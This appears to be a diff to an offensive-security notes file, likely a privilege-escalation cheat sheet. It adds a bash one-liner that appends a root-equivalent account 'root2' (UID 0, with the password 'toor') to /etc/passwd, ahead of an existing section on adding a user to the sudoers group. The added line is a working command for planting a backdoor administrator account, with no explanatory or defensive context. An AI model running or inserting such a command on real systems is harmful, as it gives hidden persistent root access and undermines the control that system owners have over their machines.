@@ -1,3 +1,8 @@
+Add root2 to /etc/passwd:
+```bash
+echo "root2:$(openssl passwd toor):0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
 Add user to SUDOers group:
 
 ```shell
